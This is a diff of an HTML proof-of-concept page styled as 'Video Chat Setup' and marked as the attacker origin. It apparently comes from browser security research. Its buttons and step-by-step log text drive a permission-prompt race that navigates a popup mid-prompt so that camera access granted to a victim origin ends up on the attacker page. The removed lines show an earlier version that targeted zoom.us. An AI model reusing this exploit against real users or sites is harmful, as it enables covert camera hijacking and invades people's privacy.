@@ -5,51 +5,63 @@
 <title>Video Chat</title>
 <style>
 body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
-h1{font-size:1.1em;margin-bottom:20px}
+h1{font-size:1.1em}
 button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
 button:hover{background:#eee}
 button.race{background:#c00;color:#fff;border-color:#a00}
 button.check{background:#080;color:#fff;border-color:#060}
-pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap}
+pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap;font-family:monospace}
 </style>
 </head>
 <body>
 <h1>Video Chat Setup</h1>
-<button onclick="step1()">1. Enable Camera</button>
+
+<button onclick="step1()">1. Block Camera Here</button>
 <button onclick="step2()">2. Open Popup</button>
 <button class="race" onclick="step3()">3. Race</button>
 <button class="check" onclick="step4()">4. Check</button>
-<pre id="L">Ready.</pre>
+
+<pre id="L">[attacker — 127.0.0.1:9080]
+
+1. Click "Block Camera Here" → on the popup prompt, click BLOCK.
+   Camera is now blocked on this origin.
+
+2. Click "Open Popup" → a popup opens to localhost:9081.
+   Follow the steps on the popup page, then come back here.
+
+3. After the popup's camera bubble is open with "Allow" selected:
+   Click "Race" here.
+
+4. Click "Check" to see if camera was stolen.</pre>
 
 <script>
 var popup;
-var victim = location.hostname==='127.0.0.1' ? 'http://localhost:9081' : 'https://zoom.us';
-var log = function(m){ var e=document.getElementById('L'); e.textContent+=m+'\n'; try{e.scrollTop=e.scrollHeight}catch(_){} };
+var log = function(m){ var e = document.getElementById('L'); e.textContent += m + '\n'; };
 
 function step1(){
-  log('Requesting camera...');
+  log('Calling getUserMedia...');
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('Granted — block it for race') })
-    .catch(function(e){ log('State: '+e.name) });
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('GRANTED — click BLOCK on the prompt.'); })
+    .catch(function(e){ log('Camera: ' + e.name + (e.name==='NotAllowedError' ? ' ✓ BLOCKED' : '')); });
 }
 
 function step2(){
-  popup = window.open(victim,'p','width=500,height=350');
-  if(!popup){ log('Popup blocked'); return }
-  log('Popup → '+victim);
-  log('In popup: click blocked camera icon → select Always allow → DON\'T click Done');
+  popup = window.open('http://localhost:9081/victim.html','p','width=500,height=320');
+  if(!popup){ log('Popup blocked — allow popups for 127.0.0.1:9080'); return; }
+  log('Popup open → localhost:9081');
 }
 
 function step3(){
-  if(!popup){ log('Open popup first'); return }
-  popup.location = location.origin+'/race.html';
-  log('Race: popup → '+location.origin+'/race.html');
+  if(!popup){ log('Open popup first (step 2).'); return; }
+  try { popup.location = location.origin + '/race.html'; log('Race fired.'); }
+  catch(e){ log('Race error: ' + e); }
 }
 
 function step4(){
+  log('Checking camera on 127.0.0.1:9080...');
   navigator.mediaDevices.getUserMedia({video:true})
-    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('CAMERA GRANTED — race may have worked') })
-    .catch(function(e){ log('Blocked: '+e.name) });
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('⚠️ CAMERA GRANTED — race succeeded.'); })
+    .catch(function(e){ log('Camera: ' + e.name + ' — race not won or fix present.'); });
 }
 </script>
 </body>
